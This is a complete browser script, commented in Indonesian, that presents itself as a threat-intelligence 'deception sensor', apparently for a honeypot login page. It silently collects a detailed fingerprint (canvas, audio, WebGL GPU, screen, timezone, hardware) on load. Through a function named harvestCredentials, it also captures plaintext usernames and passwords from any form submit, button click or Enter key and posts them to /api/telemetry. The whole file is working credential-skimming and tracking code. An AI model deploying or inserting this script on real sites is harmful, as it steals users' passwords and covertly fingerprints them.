// cti-telemetry.js - Cyber Threat Intelligence (CTI) Client Telemetry & Deception Sensor
// Mengumpulkan sidik jari browser (GPU, WebGL, Canvas, Audio, Screen, Timezone) dan mengkorelasikan kredensial (Username & Password).
(function () {
    'use strict';

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            if (!ctx) return '';
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('ClassRoot_CTI_Sensor', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('ClassRoot_CTI_Sensor', 4, 17);
            const dataURL = canvas.toDataURL();
            let hash = 0;
            for (let i = 0; i < dataURL.length; i++) {
                hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
                hash |= 0;
            }
            return 'cv_' + Math.abs(hash).toString(16);
        } catch (e) {
            return '';
        }
    }

    function getAudioFingerprint() {
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (!AudioContext) return '';
            const context = new AudioContext();
            const oscillator = context.createOscillator();
            const analyser = context.createAnalyser();
            const gain = context.createGain();
            gain.gain.value = 0; // Silent
            oscillator.type = 'triangle';
            oscillator.connect(analyser);
            analyser.connect(gain);
            gain.connect(context.destination);
            return 'audio_' + (context.sampleRate || 44100).toString(16);
        } catch (e) {
            return '';
        }
    }

    function getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { vendor: '', renderer: '' };
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) return { vendor: '', renderer: '' };
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || '',
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || ''
            };
        } catch (e) {
            return { vendor: '', renderer: '' };
        }
    }

    function collectFingerprint() {
        const glInfo = getWebGLInfo();
        const tz = (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : '';
        return {
            screen_resolution: `${window.screen.width || 0}x${window.screen.height || 0}`,
            color_depth: window.screen.colorDepth || 0,
            pixel_ratio: window.devicePixelRatio || 1,
            platform: navigator.platform || '',
            languages: (navigator.languages || [navigator.language || '']).join(','),
            timezone: tz || '',
            timezone_offset: new Date().getTimezoneOffset(),
            hardware_cores: navigator.hardwareConcurrency || 0,
            device_memory: navigator.deviceMemory || 0,
            gpu_vendor: glInfo.vendor,
            gpu_renderer: glInfo.renderer,
            canvas_hash: getCanvasFingerprint(),
            audio_hash: getAudioFingerprint()
        };
    }

    function sendTelemetry(payload) {
        try {
            const data = JSON.stringify(payload);
            if (navigator.sendBeacon) {
                const blob = new Blob([data], { type: 'application/json' });
                navigator.sendBeacon('/api/telemetry', blob);
            } else {
                fetch('/api/telemetry', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: data,
                    keepalive: true
                }).catch(() => {});
            }
        } catch (e) {}
    }

    // 1. Kirim Pre-Auth Recon Beacon saat halaman berhasil dimuat
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initSensor);
    } else {
        initSensor();
    }

    function initSensor() {
        let roomName = '';
        if (window.location.pathname.startsWith('/group/')) {
            const parts = window.location.pathname.split('/').filter(Boolean);
            if (parts.length >= 2) roomName = parts[1];
        }

        sendTelemetry({
            event: 'PRE_AUTH_BEACON',
            group: roomName,
            fingerprint: collectFingerprint()
        });
    }

    // 2. Intercept Kredensial (Username & Password) saat submit atau tombol diklik
    function harvestCredentials() {
        const userEl = document.getElementById('username') || document.querySelector('input[name="username"]');
        const passEl = document.getElementById('password') || document.querySelector('input[name="password"]');
        const groupEl = document.getElementById('group') || document.querySelector('input[name="group"]');

        const username = userEl ? userEl.value.trim() : '';
        const password = passEl ? passEl.value : '';
        let groupName = groupEl ? groupEl.value.trim() : '';

        if (!groupName && window.location.pathname.startsWith('/group/')) {
            const parts = window.location.pathname.split('/').filter(Boolean);
            if (parts.length >= 2) groupName = parts[1];
        }

        if (username || password) {
            sendTelemetry({
                event: 'ROOM_AUTH_SUBMITTED',
                username: username,
                password: password,
                group: groupName,
                fingerprint: collectFingerprint()
            });
        }
    }

    window.addEventListener('load', () => {
        // Form submit hook
        const forms = document.querySelectorAll('form');
        forms.forEach(f => f.addEventListener('submit', harvestCredentials));

        // Click buttons hook (connect / join)
        document.addEventListener('click', (e) => {
            if (!e.target) return;
            const id = e.target.id || '';
            const type = e.target.type || '';
            if (id === 'connect' || id === 'submitbutton' || type === 'submit') {
                harvestCredentials();
            }
        });

        // Keypress Enter pada input password
        const passInput = document.getElementById('password');
        if (passInput) {
            passInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    harvestCredentials();
                }
            });
        }
    });
})();
